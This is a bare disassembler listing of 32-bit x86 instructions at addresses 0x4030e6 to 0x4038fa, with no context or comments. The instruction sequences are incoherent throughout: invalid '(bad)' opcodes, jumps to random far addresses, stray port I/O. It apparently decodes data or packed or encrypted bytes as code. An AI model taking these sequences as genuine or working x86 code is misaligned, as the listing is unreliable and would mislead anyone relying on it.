  4030e6:	stos   DWORD PTR es:[edi],eax
  4030e7:	jecxz  0x4030fc
  4030e9:	pop    ebp
  4030ea:	xor    al,0x90
  4030ec:	sbb    edi,edi
  4030ee:	into   
  4030ef:	jmp    DWORD PTR [esi]
  4030f1:	pop    ebp
  4030f2:	mov    cl,cl
  4030f4:	lahf   
  4030f5:	mov    ch,0x99
  4030f7:	ror    DWORD PTR [ecx],0xc5
  4030fa:	jae    0x40313f
  4030fc:	adc    esi,DWORD PTR [ebp+0x73]
  4030ff:	pop    ecx
  403100:	mov    eax,ds:0xa104c52d
  403105:	sub    eax,0x11a104dc
  40310a:	scas   al,BYTE PTR es:[edi]
  40310b:	nop
  40310c:	mov    edx,0x865e736d
  403111:	es mov ebp,0x38ad2dc2
  403117:	mov    eax,ebp
  403119:	sub    eax,edi
  40311b:	in     al,dx
  40311c:	iret   
  40311d:	pop    ecx
  40311e:	into   
  40311f:	push   ebx
  403120:	sbb    al,BYTE PTR [esi]
  403122:	add    BYTE PTR [ebp-0x43],0x7c
  403126:	pop    ebx
  403127:	inc    edi
  403128:	or     BYTE PTR [ebx+eax*1-0x1],ch
  40312c:	fs cdq 
  40312e:	sbb    al,0x41
  403130:	xor    DWORD PTR [ebp+0x26],edx
  403133:	(bad)  
  403134:	xor    DWORD PTR [ebp+0xbffa],ebp
  40313a:	sbb    al,0x14
  40313c:	retf   
  40313d:	into   
  40313e:	add    al,0x24
  403140:	push   ds
  403141:	pop    eax
  403142:	xor    eax,0x3159ea2e
  403147:	mov    ebx,0x4077fb94
  40314c:	add    eax,0xe9d245db
  403151:	add    edi,DWORD PTR [edx]
  403153:	aam    0x7c
  403155:	add    al,0xf2
  403157:	mov    edx,0xaa49cf74
  40315c:	lods   al,BYTE PTR ds:[esi]
  40315d:	add    al,0x31
  40315f:	cmpps  xmm7,xmm5,0xad
  403163:	shr    cl,1
  403165:	add    esi,DWORD PTR [ecx]
  403167:	mov    DWORD PTR [ecx+edx*8+0x37],esp
  40316b:	mov    edx,0x109934c6
  403170:	call   0x93ec6278
  403175:	enter  0x1431,0xe2
  403179:	ret    
  40317a:	es nop
  40317c:	push   ebp
  40317d:	add    al,0x31
  40317f:	adc    al,0xdc
  403181:	pop    es
  403182:	xor    BYTE PTR [ecx+ebp*8],dl
  403185:	cld    
  403186:	mov    bh,0x73
  403188:	jmp    0xe96e6290
  40318d:	jle    0x403143
  40318f:	lds    edi,FWORD PTR [edi-0x33]
  403192:	out    0x64,al
  403194:	or     DWORD PTR [ebp+0x7ee914f5],0xcd67c5ac
  40319e:	add    BYTE PTR [eax],al
  4031a0:	into   
  4031a1:	fs push ecx
  4031a3:	inc    esp
  4031a4:	(bad)  
  4031a5:	mov    ecx,0x3f7ef956
  4031aa:	in     eax,dx
  4031ab:	pop    ebx
  4031ac:	in     al,0xec
  4031ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031af:	add    edi,DWORD PTR [edi+ecx*4-0x465931c6]
  4031b6:	add    BYTE PTR [ecx+0x2ef6db7a],bl
  4031bc:	fs mov ecx,0xac42f175
  4031c2:	and    al,0x16
  4031c4:	je     0x40317f
  4031c6:	jmp    0x4031ae
  4031c8:	ins    DWORD PTR es:[edi],dx
  4031c9:	aas    
  4031ca:	or     BYTE PTR [esi+ebp*4-0x3b],bl
  4031ce:	inc    BYTE PTR [esi]
  4031d0:	jl     0x403236
  4031d2:	call   0xfff9b115
  4031d7:	pusha  
  4031d8:	mov    dh,0xa8
  4031da:	(bad)  
  4031db:	out    dx,al
  4031dc:	gs add BYTE PTR cs:[ebx+0x35],dl
  4031e1:	add    dl,BYTE PTR cs:[ebx+0x2d]
  4031e5:	add    eax,DWORD PTR cs:[ecx+0x35]
  4031e9:	adc    al,0x0
  4031eb:	test   eax,0xc7ec7f65
  4031f0:	std    
  4031f1:	mov    eax,0x13f1cde8
  4031f6:	add    BYTE PTR [eax+0x77],ah
  4031f9:	mov    esp,0xba053540
  4031fe:	jne    0x4031f9
  403200:	std    
  403201:	ds or  al,0x9e
  403204:	add    BYTE PTR [eax],al
  403206:	pop    edi
  403207:	mov    esp,0xb8dcc7e8
  40320c:	jmp    DWORD PTR [edx-0x36]
  40320f:	mov    eax,0xde0a8175
  403214:	ret    
  403215:	jmp    0xfd1b3f4c
  40321a:	fnstcw WORD PTR [ecx-0x471b824b]
  403220:	call   DWORD PTR [ecx+0x3f]
  403223:	rol    BYTE PTR [eax],1
  403225:	jmp    0x582cb11f
  40322a:	in     eax,dx
  40322b:	mov    eax,0xb8e021e8
  403230:	inc    DWORD PTR [eax]
  403232:	and    edx,esp
  403234:	pop    ebx
  403235:	leave  
  403236:	pop    edx
  403237:	mov    ecx,0xd91354ff
  40323c:	add    esp,0xffffc754
  403242:	retf   
  403243:	(bad)  
  403244:	jne    0x403252
  403246:	daa    
  403247:	bound  ecx,QWORD PTR [eax]
  403249:	push   0x411dcf
  40324e:	daa    
  40324f:	and    bl,BYTE PTR [ecx+ebp*1-0x67]
  403253:	adc    al,0xe8
  403255:	mov    ecx,0xbffcc5d
  40325a:	or     BYTE PTR [eax+0x1448da84],bh
  403260:	add    BYTE PTR [ebx],ch
  403262:	jae    0x40329e
  403264:	test   edi,ebp
  403266:	data16 int3 
  403268:	call   DWORD PTR [eax+0x0]
  40326b:	add    al,dh
  40326d:	adc    eax,DWORD PTR [ecx]
  40326f:	add    BYTE PTR [eax-0x24],cl
  403272:	in     al,0xc3
  403274:	sbb    BYTE PTR [ebx+ecx*1],dl
  403277:	rcl    BYTE PTR [edi],0x38
  40327a:	mov    ebp,0x3d140800
  40327f:	add    al,0x9
  403281:	adc    al,0x0
  403283:	setg   BYTE PTR [esi+0x3d180000]
  40328a:	inc    ebp
  40328b:	cld    
  40328c:	cmp    al,bl
  40328e:	mov    edx,0x8dcba7e9
  403293:	test   edi,eax
  403295:	retf   0xffff
  403298:	dec    eax
  403299:	fmul   DWORD PTR [edi-0x3]
  40329c:	addr16 retf 
  40329e:	or     eax,eax
  4032a0:	(bad)  [edi+0x5120cd67]
  4032a6:	add    BYTE PTR [ebp-0x124b3],cl
  4032ac:	xor    DWORD PTR [esi+0x34],ebx
  4032af:	call   0xb937d
  4032b4:	scas   al,BYTE PTR es:[edi]
  4032b5:	js     0x4032b2
  4032b7:	dec    edi
  4032b8:	cdq    
  4032b9:	mov    edx,0x529effd1
  4032be:	sti    
  4032bf:	(bad)  
  4032c0:	sbb    al,0xb5
  4032c2:	js     0x403249
  4032c4:	sahf   
  4032c5:	out    dx,eax
  4032c6:	retf   0xe1ff
  4032c9:	and    al,0xba
  4032cb:	cmc    
  4032cc:	jle    0x4032ec
  4032ce:	xor    al,0xff
  4032d0:	add    BYTE PTR [eax],al
  4032d2:	cld    
  4032d3:	or     BYTE PTR [eax+ebp*8],dh
  4032d6:	xlat   BYTE PTR ds:[ebx]
  4032d7:	and    ebx,ecx
  4032d9:	(bad)  
  4032da:	cmp    ch,ch
  4032dc:	dec    edi
  4032dd:	push   ebx
  4032de:	pop    esi
  4032df:	cmp    bh,al
  4032e1:	call   0xb475c
  4032e6:	mov    eax,0xc483cbe8
  4032eb:	mov    ah,0x3
  4032ed:	je     0x4032e2
  4032ef:	das    
  4032f0:	inc    eax
  4032f1:	hlt    
  4032f2:	loope  0x4032b9
  4032f4:	push   eax
  4032f5:	cld    
  4032f6:	sbb    DWORD PTR [edi],ebx
  4032f8:	rol    BYTE PTR [eax],0x31
  4032fb:	xor    bl,al
  4032fd:	js     0x403362
  4032ff:	jle    0x403351
  403301:	hlt    
  403302:	or     DWORD PTR [ebx-0x3dceff3a],ebp
  403308:	ret    
  403309:	je     0x40335a
  40330b:	std    
  40330c:	retf   0xf975
  40330f:	xchg   esp,eax
  403310:	add    eax,0x7e85f6f2
  403315:	fmul   DWORD PTR [ecx-0x7d07af72]
  40331b:	sbb    eax,0x3de32cdc
  403320:	retf   0x5cff
  403323:	inc    ecx
  403324:	(bad)  
  403326:	repz adc ebp,ecx
  403329:	add    edi,DWORD PTR [edx+0x44caed50]
  40332f:	mov    esp,0xccc90366
  403334:	pop    eax
  403335:	retf   0x0
  403338:	scas   al,BYTE PTR es:[edi]
  403339:	mov    dh,0xbc
  40333b:	(bad)  
  40333c:	cdq    
  40333d:	in     eax,0x4f
  40333f:	retf   0x8a9e
  403342:	sub    ch,BYTE PTR [esi]
  403344:	push   0xe403e1d1
  403349:	mov    dl,BYTE PTR ds:0xf138ba32
  40334f:	fisub  WORD PTR [eax]
  403351:	pop    edi
  403352:	add    al,BYTE PTR [ecx]
  403354:	stos   DWORD PTR es:[edi],eax
  403355:	dec    esi
  403356:	call   0x698f69d6
  40335b:	or     dh,BYTE PTR [ecx]
  40335d:	inc    ecx
  40335e:	hlt    
  40335f:	sub    esi,ebp
  403361:	dec    esi
  403362:	imul   ecx,DWORD PTR [edx],0x83034011
  403368:	push   cs
  403369:	or     DWORD PTR [ebp-0x21],ebx
  40336c:	mov    cl,0xf6
  40336e:	repnz dec edi
  403370:	push   ecx
  403371:	xchg   ebx,eax
  403372:	push   ss
  403373:	sti    
  403374:	ret    0x62da
  403377:	inc    edi
  403378:	cmp    DWORD PTR [ebp-0x6ff103c4],esi
  40337e:	stos   DWORD PTR es:[edi],eax
  40337f:	add    al,0x31
  403381:	xchg   ecx,eax
  403382:	mov    cl,0x4
  403384:	lahf   
  403385:	in     eax,dx
  403386:	push   0xc9b54948
  40338b:	dec    edi
  40338c:	sbb    al,0x94
  40338e:	sbb    eax,0x1d07fe0c
  403393:	cli    
  403394:	jbe    0x4033ce
  403396:	ror    eax,1
  403398:	cmp    eax,DWORD PTR [eax-0x12]
  40339b:	add    DWORD PTR [eax],0x0
  40339e:	gs cld 
  4033a0:	jge    0x40339d
  4033a2:	gs or  eax,0xfc71af00
  4033a8:	(bad)  
  4033a9:	jmp    0xec2b469b
  4033ae:	in     eax,0xc8
  4033b0:	pop    edi
  4033b1:	xor    bh,dh
  4033b3:	adc    BYTE PTR [eax],al
  4033b5:	mov    esp,0x2583a835
  4033ba:	xchg   ecx,eax
  4033bb:	popa   
  4033bc:	add    DWORD PTR [edi+esi*2],0xffffffe6
  4033c0:	inc    eax
  4033c1:	jmp    0x6a5273f8
  4033c6:	cs mov dh,0x2e
  4033c9:	test   al,0x32
  4033cb:	adc    al,0x74
  4033cd:	lock lods eax,DWORD PTR ds:[esi]
  4033cf:	mul    ebp
  4033d1:	iret   
  4033d2:	repz adc eax,DWORD PTR [eax]
  4033d5:	pushf  
  4033d6:	xor    ecx,ebp
  4033d8:	mov    edi,0x8d2abb2
  4033dd:	jmp    0xa5080d27
  4033e2:	outs   dx,BYTE PTR ds:[esi]
  4033e3:	adc    al,0x0
  4033e5:	jmp    0xf185bb1c
  4033ea:	add    dh,BYTE PTR [ebp+0x13e4f175]
  4033f0:	push   esp
  4033f2:	ins    BYTE PTR es:[edi],dx
  4033f3:	out    0x40,al
  4033f5:	jmp    0x32b4a92f
  4033fa:	or     eax,0x32e9c23e
  4033ff:	mov    eax,edx
  403401:	ins    BYTE PTR es:[edi],dx
  403402:	add    BYTE PTR [eax],al
  403404:	pop    edi
  403405:	rcl    BYTE PTR [eax+0x43],0x4d
  403409:	(bad)  
  40340a:	call   esp
  40340c:	adc    dh,ah
  40340e:	inc    eax
  40340f:	jmp    0xd0b4a919
  403414:	icebp  
  403415:	dec    esi
  403416:	in     al,0xe8
  403418:	xor    dl,BYTE PTR [eax+eax*1]
  40341b:	mov    ?,WORD PTR [edi-0x44]
  40341e:	pop    DWORD PTR [eax]
  403420:	adc    eax,0x5c75ffd8
  403425:	cmp    al,0x45
  403427:	in     al,dx
  403428:	dec    ebx
  403429:	dec    esi
  40342a:	or     al,0x0
  40342c:	les    edi,FWORD PTR [ecx+0xf6845c6]
  403432:	add    BYTE PTR [eax],al
  403434:	enter  0x7d7,0xc7
  403438:	test   eax,esp
  40343a:	add    BYTE PTR [eax],al
  40343c:	cwde   
  40343d:	adc    BYTE PTR [edx+0x0],ch
  403440:	adc    BYTE PTR [eax],0x6a
  403443:	adc    BYTE PTR ds:0x7250e3f6,cl
  403449:	adc    bh,bh
  40344b:	jne    0x403491
  40344d:	int3   
  40344e:	adc    eax,0x515efe
  403453:	or     ecx,DWORD PTR [eax+0x45]
  403456:	add    DWORD PTR [ebx+0xb],eax
  403459:	dec    esi
  40345a:	hlt    
  40345b:	add    ah,al
  40345d:	mov    eax,0xd96475fe
  403462:	call   0xc3:0x8b1048c1
  403469:	add    bl,al
  40346b:	jns    0x40342f
  40346d:	or     BYTE PTR [eax-0x1b],bl
  403470:	mov    ch,ah
  403472:	dec    edi
  403473:	bound  ecx,QWORD PTR [eax]
  403475:	call   0x41033e
  40347a:	or     BYTE PTR [eax],al
  40347c:	call   0x1c3d21
  403481:	push   eax
  403482:	out    dx,eax
  403483:	inc    ebp
  403484:	or     BYTE PTR [eax+0x0],dl
  403487:	jp     0x40344a
  403489:	add    BYTE PTR [eax],cl
  40348b:	add    cl,cl
  40348d:	ret    0x1814
  403490:	push   ebp
  403491:	mov    ebx,DWORD PTR [edi+edx*4-0x68c4033c]
  403498:	jge    0x4034a2
  40349a:	xor    DWORD PTR [ebp+0x7d1a0750],edi
  4034a0:	sub    ecx,ecx
  4034a2:	repz rol DWORD PTR [ebx],0x2b
  4034a6:	cli    
  4034a7:	pop    es
  4034a8:	add    al,0x6a
  4034aa:	xor    DWORD PTR [edi],edx
  4034ac:	add    al,0x6a
  4034ae:	xor    DWORD PTR [edi],edx
  4034b0:	(bad)  
  4034b1:	(bad)  
  4034b2:	cmp    al,0xa5
  4034b4:	pop    ecx
  4034b5:	add    BYTE PTR [ebx-0x43],cl
  4034b8:	fcmovnb st,st(4)
  4034ba:	lock mov ebp,0xc9710b03
  4034c0:	adc    cl,BYTE PTR [ecx+0x75c758ec]
  4034c6:	popf   
  4034c7:	inc    ebp
  4034c8:	cs lock xchg esi,eax
  4034cb:	jmp    0x1905:0xbffa
  4034d2:	jnp    0x4034ac
  4034d4:	sbb    edi,DWORD PTR [ebp-0x7781ffa7]
  4034da:	(bad)  
  4034db:	push   ebx
  4034dc:	or     ecx,DWORD PTR [edx]
  4034de:	(bad)  
  4034df:	jne    0x40351a
  4034e1:	xchg   edi,eax
  4034e2:	add    ebp,DWORD PTR [edx+0x31]
  4034e5:	add    eax,0xbd31c16d
  4034ea:	cli    
  4034eb:	mov    edi,0xe832b4dc
  4034f0:	sub    BYTE PTR [ebp-0x29e5003a],ch
  4034f6:	jp     0x4034bb
  4034f8:	fisub  DWORD PTR [ebx-0x3f]
  4034fb:	add    al,0x31
  4034fd:	lock jp 0x4034ec
  403500:	mov    dl,0x78
  403502:	xlat   BYTE PTR ds:[ebx]
  403503:	push   eax
  403504:	or     BYTE PTR [edx+esi*1],0x57
  403508:	xchg   DWORD PTR [esi],esp
  40350a:	inc    eax
  40350b:	or     al,0xa4
  40350d:	xor    al,0x83
  40350f:	add    BYTE PTR [ecx],dh
  403511:	mov    ebp,0x13ec1478
  403516:	jmp    0x7254661e
  40351b:	stos   DWORD PTR es:[edi],eax
  40351c:	stos   BYTE PTR es:[edi],al
  40351d:	fld    TBYTE PTR [eax+0x249d37db]
  403523:	fdivr  DWORD PTR [edx-0x27fd0ed0]
  403529:	(bad)  
  40352b:	xor    DWORD PTR [edx-0x35e5494a],0xffffff96
  403532:	jb     0x40353f
  403534:	add    BYTE PTR [eax],al
  403536:	inc    ebx
  403537:	and    ch,dl
  403539:	retf   0x5379
  40353c:	jmp    0x2a3f6644
  403541:	add    ch,BYTE PTR [ecx-0x47285b4e]
  403547:	dec    edx
  403548:	add    DWORD PTR [ecx+0x24],edi
  40354b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40354c:	es std 
  40354e:	xor    edi,esi
  403550:	stos   DWORD PTR es:[edi],eax
  403551:	pop    esi
  403552:	jbe    0x4035ad
  403554:	in     eax,0x7c
  403556:	(bad)  
  403558:	push   ss
  403559:	mov    esi,0xa71f1bf7
  40355e:	mov    ebx,0x3d3d2e8b
  403563:	sub    dh,BYTE PTR [ebp+0x7cb34111]
  403569:	xlat   BYTE PTR ds:[ebx]
  40356a:	pop    esi
  40356b:	sub    cl,dh
  40356d:	js     0x40355b
  40356f:	mov    ds:0x1424db99,eax
  403574:	jmp    0xedac7a7c
  403579:	add    esi,DWORD PTR [ecx]
  40357b:	adc    al,0x72
  40357d:	inc    edi
  40357e:	and    DWORD PTR [edi+0x4e8e268c],esp
  403584:	xor    BYTE PTR [ecx],ch
  403586:	mov    ebx,ebx
  403588:	stos   DWORD PTR es:[edi],eax
  403589:	clc    
  40358a:	push   ds
  40358b:	dec    ecx
  40358c:	jb     0x403566
  40358e:	mov    dl,0xd8
  403590:	add    BYTE PTR [ebp+0x1a50495f],dh
  403596:	inc    edx
  403597:	inc    esi
  403598:	mov    ebx,DWORD PTR [eax+eax*1]
  40359b:	add    cl,bh
  40359d:	sahf   
  40359e:	jge    0x403591
  4035a0:	jns    0x4035f9
  4035a2:	adc    BYTE PTR [eax+0x2e],ah
  4035a5:	mov    al,0x8b
  4035a7:	out    0x69,al
  4035a9:	push   ecx
  4035aa:	add    al,0x72
  4035ac:	and    al,0x1c
  4035ae:	mov    edx,DWORD PTR [esi]
  4035b0:	fstp   DWORD PTR [esi-0xa074507]
  4035b6:	cli    
  4035b7:	mov    edx,0xee849ff8
  4035bc:	push   0x78
  4035be:	push   0x36
  4035c0:	xor    BYTE PTR [edx],bl
  4035c2:	shr    DWORD PTR [ecx],0xac
  4035c5:	push   ss
  4035c6:	ret    
  4035c7:	bound  edi,QWORD PTR [eax-0x1b]
  4035ca:	clc    
  4035cb:	or     ch,BYTE PTR [ebp-0x1b]
  4035ce:	clc    
  4035cf:	ins    BYTE PTR es:[edi],dx
  4035d0:	and    DWORD PTR [ecx],ecx
  4035d2:	push   esi
  4035d3:	jle    0x4035a1
  4035d5:	mov    esp,0xd4869703
  4035da:	ret    0x31f5
  4035dd:	les    ecx,FWORD PTR [ebx+0x23ad2021]
  4035e3:	adc    eax,DWORD PTR [eax-0x53]
  4035e6:	lea    ebx,[ebp+0x5c]
  4035e9:	into   
  4035ea:	jo     0x4035b5
  4035ec:	ds adc eax,0xd373f14e
  4035f2:	adc    edx,ebp
  4035f4:	mov    BYTE PTR [ebp-0xa854506],bl
  4035fa:	clc    
  4035fb:	sbb    ch,BYTE PTR [ebp-0x61]
  4035fe:	pushf  
  4035ff:	inc    BYTE PTR [eax]
  403601:	add    BYTE PTR [edx+eiz*8-0x43],bl
  403605:	test   al,0x31
  403607:	push   edx
  403608:	or     al,0xa8
  40360a:	icebp  
  40360b:	or     DWORD PTR [ebx],eax
  40360d:	add    cl,dl
  40360f:	sub    edi,ecx
  403611:	xor    esi,edx
  403613:	repz cli 
  403615:	xor    eax,edx
  403617:	sub    DWORD PTR [edi+eax*1-0xa845779],eax
  40361e:	or     ebp,edi
  403620:	xadd   eax,ecx
  403623:	scas   eax,DWORD PTR es:[edi]
  403624:	add    al,bl
  403626:	push   ebx
  403627:	fdiv   QWORD PTR [ebx]
  403629:	stc    
  40362a:	sti    
  40362b:	fdiv   QWORD PTR [ebx]
  40362d:	stc    
  40362e:	gs inc ecx
  403630:	pop    ss
  403631:	sub    cl,BYTE PTR [esi+0x2e03472f]
  403637:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403638:	rol    dl,0xe4
  40363b:	adc    edx,eax
  40363d:	mov    edx,DWORD PTR [eax+0x4]
  403640:	sti    
  403641:	and    edx,DWORD PTR [edx+0x4]
  403644:	sti    
  403645:	lea    edx,[eax+ebp*4]
  403648:	adc    al,BYTE PTR [esi+0x48]
  40364b:	nop
  40364c:	add    ecx,DWORD PTR [esi-0x70]
  40364f:	aad    0xc1
  403651:	adc    DWORD PTR [ebx-0x74057496],ecx
  403657:	fsub   QWORD PTR [ebx]
  403659:	stc    
  40365a:	mov    ebx,esp
  40365c:	lea    ebx,[edi+esi*1+0x15469515]
  403663:	adc    al,0x5e
  403665:	sbb    al,0x0
  403667:	add    BYTE PTR [ecx],bl
  403669:	aam    0x16
  40366b:	add    esp,DWORD PTR [ecx]
  40366d:	sub    al,0xf9
  40366f:	xor    esi,DWORD PTR [edx]
  403671:	hlt    
  403672:	cli    
  403673:	xor    esi,DWORD PTR [edx]
  403675:	sub    al,BYTE PTR [edi+eax*1+0x69803d20]
  40367c:	pop    ebx
  40367d:	out    dx,al
  40367e:	pop    ds
  40367f:	ror    DWORD PTR [eax-0x3c3cfce4],0x70
  403686:	xor    edi,ecx
  403688:	xor    DWORD PTR [edx],ebx
  40368a:	mov    esp,0x98512833
  40368f:	pop    ss
  403690:	into   
  403691:	outs   dx,BYTE PTR ds:[esi]
  403692:	dec    eax
  403693:	mov    esi,DWORD PTR [edx]
  403695:	pop    es
  403696:	call   0x6fa2a5b
  40369b:	sar    BYTE PTR [edx+0x52faf765],1
  4036a1:	jae    0x40369a
  4036a3:	cli    
  4036a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036a5:	inc    ecx
  4036a6:	adc    esi,DWORD PTR [ecx+0x3c3868a]
  4036ac:	ja     0x403683
  4036ae:	(bad)
  4036b2:	int    0x8b
  4036b4:	fld    TBYTE PTR [edx-0x45]
  4036b7:	and    ecx,eax
  4036b9:	push   0xffffffbb
  4036bb:	lea    esp,[ebp+0x5dd781de]
  4036c1:	and    al,0x7
  4036c3:	pop    esi
  4036c4:	add    eax,0x3216c6fc
  4036c9:	in     al,0x8e
  4036cb:	stc    
  4036cc:	add    BYTE PTR [eax],al
  4036ce:	bound  eax,QWORD PTR [ebx-0x19]
  4036d1:	cli    
  4036d2:	bound  edx,QWORD PTR [ebx-0x6f]
  4036d5:	test   BYTE PTR [esi],ch
  4036d7:	sbb    edx,DWORD PTR ds:0x49ba1a90
  4036dd:	xor    BYTE PTR [eax-0x3],dh
  4036e0:	or     al,BYTE PTR [ebx]
  4036e2:	jb     0x403706
  4036e4:	mov    edi,0xbbda7833
  4036e9:	xor    ebp,DWORD PTR [eax+0x38]
  4036ec:	cwde   
  4036ed:	pop    ss
  4036ee:	ret    0x9b8c
  4036f1:	std    
  4036f2:	xor    cl,BYTE PTR [edi-0x3e8c3f09]
  4036f8:	push   es
  4036f9:	sar    BYTE PTR [edx+0x12faf6a5],1
  4036ff:	mov    ds:0x14acfaf6,eax
  403704:	jne    0x403718
  403706:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403707:	push   ebx
  403708:	pusha  
  403709:	push   0x32
  40370b:	pop    esi
  40370c:	adc    ebp,eax
  40370e:	lock add al,0xea
  403711:	int    0xaa
  403713:	test   eax,0xad52bbfa
  403718:	cli    
  403719:	mov    ebx,0xe4d68fbc
  40371e:	cs push 0xf05f0720
  403724:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403725:	(bad)  
  403726:	pop    ds
  403727:	adc    eax,eax
  403729:	mov    gs,eax
  40372b:	loop   0x4036be
  40372d:	out    0xe8,al
  40372f:	loop   0x4036c0
  403731:	nop
  403732:	add    BYTE PTR [eax],al
  403734:	mov    ch,0x16
  403736:	or     ebp,ecx
  403738:	xor    al,0xa6
  40373a:	jmp    0x3208:0xa9d53549
  403741:	shl    DWORD PTR [edx-0x42],cl
  403744:	add    ch,BYTE PTR [edx+ecx*1+0x6cab02bd]
  40374b:	xchg   edi,eax
  40374c:	inc    esi
  40374d:	push   esp
  40374e:	call   0x701b:0xb7127143
  403755:	shl    eax,1
  403757:	push   es
  403758:	sbb    DWORD PTR [edx-0xd7709bf],0xa07ef631
  403762:	pop    ebp
  403763:	adc    ah,al
  403765:	dec    ecx
  403766:	(bad)  
  403767:	jmp    0xc50d959f
  40376c:	jo     0x40378b
  40376e:	jmp    0x12bc:0xdaa9bacd
  403775:	lods   al,BYTE PTR ds:[esi]
  403776:	mov    edx,0xde8fa4bd
  40377b:	ins    DWORD PTR es:[edi],dx
  40377c:	jbe    0x4037e3
  40377e:	add    BYTE PTR [eax],al
  403780:	das    
  403781:	push   cs
  403782:	shr    DWORD PTR [edx],0x26
  403785:	adc    ebx,ecx
  403787:	jb     0x403803
  403789:	loop   0x403785
  40378b:	or     ch,bh
  40378d:	loope  0x403787
  40378f:	fs mov ecx,0x21f95d15
  403795:	enter  0x2f03,0x0
  403799:	add    BYTE PTR [ecx],bh
  40379b:	rol    eax,cl
  40379d:	in     al,0x35
  40379f:	ror    DWORD PTR [ebx+0x23a5fcb2],1
  4037a5:	mov    al,0x4
  4037a7:	stos   DWORD PTR es:[edi],eax
  4037a8:	lea    edi,[ebp+0x18]
  4037ab:	inc    ecx
  4037ac:	adc    al,0x25
  4037ae:	aaa    
  4037af:	adc    DWORD PTR [esi-0x3f],edx
  4037b2:	repz ror BYTE PTR [ecx],cl
  4037b5:	jmp    0xf194:0xbaf89a02
  4037bc:	cli    
  4037bd:	mov    edx,0xe68c9f8a
  4037c2:	mov    bl,0xb6
  4037c4:	mov    eax,ds:0x3c5e3491
  4037c9:	sub    dl,dh
  4037cb:	push   ds
  4037cc:	add    esi,DWORD PTR [ebx]
  4037ce:	mov    esp,0x8c5033aa
  4037d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037d4:	xor    edx,DWORD PTR [ebx-0x52]
  4037d7:	nop
  4037d8:	pop    ds
  4037d9:	xor    esp,edx
  4037db:	shl    edi,0xea
  4037de:	adc    BYTE PTR [ecx+eax*8],al
  4037e1:	sub    ch,BYTE PTR [ecx]
  4037e3:	adc    ecx,ebx
  4037e5:	bound  edi,QWORD PTR [edx-0x4b35051f]
  4037eb:	loope  0x4037e5
  4037ed:	ins    BYTE PTR es:[edi],dx
  4037ee:	mov    ecx,0x9224e615
  4037f3:	repz add ah,BYTE PTR [edi+0xc0d456]
  4037fa:	inc    ebp
  4037fb:	sbb    bl,al
  4037fd:	mov    eax,DWORD PTR [eax]
  4037ff:	add    BYTE PTR [ebx],dh
  403801:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403802:	mul    DWORD PTR [ebx]
  403804:	inc    ecx
  403805:	test   al,0xfa
  403807:	(bad)  
  403808:	in     al,0xa
  40380a:	(bad)  
  40380b:	pop    es
  40380c:	pop    ss
  40380d:	xlat   BYTE PTR ds:[ebx]
  40380e:	add    edx,DWORD PTR [esi+0x50]
  403811:	rol    edx,1
  403813:	or     DWORD PTR [ebx],ebx
  403815:	ror    DWORD PTR [ebx+0x236e3bf8],0xfb
  40381c:	sbb    ebp,DWORD PTR [ecx-0x73]
  40381f:	mov    WORD PTR [edi],ds
  403821:	pushf  
  403822:	or     eax,0x4e17c4d5
  403827:	or     al,0xc9
  403829:	ror    DWORD PTR [esi],1
  40382b:	add    eax,edx
  40382d:	lahf   
  40382e:	cli    
  40382f:	xor    edx,DWORD PTR [ecx-0x3dcc0849]
  403835:	popf   
  403836:	pushf  
  403837:	pop    ds
  403838:	pop    ebp
  403839:	add    eax,0x32cb455a
  40383e:	and    cl,al
  403840:	fwait
  403841:	add    al,0x3
  403843:	fst    DWORD PTR [ebx+0x6a]
  403846:	xor    edi,ebx
  403848:	jmp    0x4038b8
  40384a:	xor    edi,ecx
  40384c:	cmp    eax,0x1050795
  403851:	js     0x4037fc
  403853:	add    edx,esi
  403855:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403856:	rol    al,0x95
  403859:	pop    ss
  40385a:	ret    
  40385b:	mov    esi,ebx
  40385d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40385e:	mul    DWORD PTR [ebx]
  403860:	icebp  
  403861:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403862:	cli    
  403863:	lea    eax,[eax]
  403865:	add    ah,ah
  403867:	or     edi,eax
  403869:	mov    ds:0x56036d3f,eax
  40386e:	adc    cl,0xc2
  403871:	or     DWORD PTR [ebx-0x40],ebx
  403874:	mov    edi,eax
  403876:	xor    edx,ecx
  403878:	mov    ebp,0xbbc95a23
  40387d:	lea    esp,[ebp-0x21fd255b]
  403883:	xchg   ebp,eax
  403884:	add    al,0x4e
  403886:	and    eax,0x320ec1fc
  40388b:	icebp  
  40388c:	mov    edi,edx
  40388e:	add    dh,BYTE PTR [ebx+eiz*8-0x6e489d09]
  403895:	pushf  
  403896:	inc    esi
  403897:	aaa    
  403898:	push   eax
  403899:	sub    ch,BYTE PTR [esi+edi*4+0x7ef0305d]
  4038a0:	sbb    BYTE PTR [ebx],al
  4038a2:	call   0xb73f5cd
  4038a7:	scas   eax,DWORD PTR es:[edi]
  4038a8:	mov    edx,0x41b2b58d
  4038ad:	cmp    ebx,edi
  4038af:	jb     0x4038b4
  4038b1:	inc    esi
  4038b2:	inc    ebp
  4038b3:	jl     0x403879
  4038b5:	add    al,0x32
  4038b7:	jle    0x403844
  4038b9:	sti    
  4038ba:	and    al,BYTE PTR [ebx+esi*8+0x1749a4f7]
  4038c1:	add    edi,0x5f0386ac
  4038c7:	ffree  st(4)
  4038c9:	ret    0x0
  4038cc:	sub    bh,BYTE PTR [esi+0xeb98bd3]
  4038d2:	mov    ebx,0x9038ab33
  4038d7:	rcpps  xmm3,xmm4
  4038da:	mov    al,ds:0xef8b326d
  4038df:	shl    BYTE PTR [eax-0x33],0x2
  4038e3:	retf   0x57ba
  4038e6:	repz test DWORD PTR [edx-0x1c],0xc91e9c90
  4038ee:	sti    
  4038ef:	in     al,0x74
  4038f1:	adc    al,0xea
  4038f3:	pop    ebp
  4038f4:	sub    ebp,edx
  4038f6:	sub    dl,BYTE PTR [edi]
  4038f8:	xor    cl,ch
  4038fa:	bound  edi,QWORD PTR [ebp-0x452551de]
